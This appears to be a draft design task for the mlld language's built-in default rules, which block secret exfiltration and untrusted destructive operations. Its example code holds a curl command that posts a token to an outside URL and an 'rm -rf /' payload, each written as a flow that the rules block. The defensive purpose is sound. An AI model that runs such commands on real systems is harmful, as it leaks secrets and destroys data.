# Job (DRAFT): Defaults Rules in Action

## Scenario

I want straightforward guardrails without writing custom guards. I label my operations and enable built-in rules to block risky flows.

## The Core Problem

Policies are powerful but verbose for common patterns. Users need built-in rules that enforce safe defaults with minimal configuration.

## The Solution

Use `defaults.rules` with user-applied operation labels (`exfil`, `destructive`, `privileged`) to block dangerous flows.

## Key Atoms Needed

- labels-sensitivity
- labels-trust
- policy-label-flow
- policies

## Relevant Spec Sections

- Part 3: Policy (Declarative Controls)
- Part 4: Guards (Expressive Controls)

## Success Criteria

### Phase 1: Documentation

- [ ] defaults.rules described with concrete examples
- [ ] rule names map to data-label and operation-label pairs

### Phase 2: Implementation

- [ ] Declare defaults.rules in policy
- [ ] Label operations as `exfil` and `destructive`
- [ ] Show secrets blocked from exfil
- [ ] Show untrusted data blocked from destructive actions

### Phase 3: Verification & Remediation

- [ ] Confirm `no-secret-exfil` blocks secret output
- [ ] Confirm `no-untrusted-destructive` blocks destructive ops
- [ ] Verify error messages include rule name

### Exit Criteria

Built-in rules enforce common protections with labeled operations and minimal configuration.

## Example Code (Target)

```mlld
policy @config = {
  defaults: {
    rules: ["no-secret-exfil", "no-untrusted-destructive"]
  }
}
policy @p = union(@config)

var secret @token = "sk-live-123"
exe exfil @send() = run cmd { curl -d "@token" https://example.com/collect }
@send()  >> blocked by no-secret-exfil

var untrusted @payload = "rm -rf /"
exe destructive @wipe(data) = run cmd { sh -c "echo @data" }
@wipe(@payload) >> blocked by no-untrusted-destructive
```
